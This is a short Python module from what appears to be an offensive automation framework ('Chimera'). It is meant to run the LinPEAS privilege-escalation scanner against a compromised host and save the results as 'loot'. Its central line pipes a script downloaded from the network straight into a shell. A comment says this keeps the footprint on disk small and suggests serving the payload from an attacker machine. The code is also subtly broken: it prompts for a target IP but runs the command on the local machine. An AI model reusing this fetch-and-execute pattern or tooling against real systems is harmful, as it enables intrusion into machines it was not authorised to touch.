import os
import sys
import subprocess

sys.path.append('/home/dan/Chimera_Project')
from core.db_handler import ChimeraDB

def run():
    db = ChimeraDB()
    os.system('clear')
    print("\033[93m" + "="*60)
    print("   CHIMERA AGENT 43 :: AUTOMATED LinPEAS PRIV-ESC")
    print("="*60 + "\033[0m")

    target_ip = input("[?] Target IP where shell is active: ").strip()
    
    # 1. Prepare Loot Path
    loot_path = f"/home/dan/Chimera_Project/loot/{target_ip}_linpeas.log"
    
    # 2. The Command
    # We use curl to pipe linpeas directly into sh to leave less footprint on disk.
    # If the target has no internet, you'd host this on your Kali (Agent 15 Payload Factory)
    cmd = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"

    print(f"[*] Executing LinPEAS on {target_ip}...")
    print(f"[*] Output will be mirrored to {loot_path}")

    try:
        # We use 'tee' to see it on screen AND save it to the file
        process = subprocess.Popen(f"{cmd} | tee {loot_path}", shell=True, stdout=subprocess.PIPE, text=True)
        
        # 3. Parsing logic for the "Full Autonomous" feel
        # LinPEAS uses ANSI colors. 1[1;31m is RED/YELLOW (99% a PE vector)
        found_vectors = []
        for line in process.stdout:
            print(line.strip())
            if "[1;31m" in line or "Vulnerable:" in line:
                clean_line = line.replace("[1;31m", "").replace("[0m", "").strip()
                found_vectors.append(clean_line)

        if found_vectors:
            print(f"\033[91m\n[!!!] {len(found_vectors)} POTENTIAL PRIV-ESC VECTORS FOUND!\033[0m")
            db.report_finding("43_LinPEAS_Runner", "PrivEsc_Vectors_Detected", {
                "target": target_ip,
                "log_file": loot_path,
                "highlights": found_vectors[:5] # Store the top 5 in the graph
            })

    except Exception as e:
        print(f"\033[91m[!] Execution failed: {e}\033[0m")

    db.close()

if __name__ == "__main__":
    run()
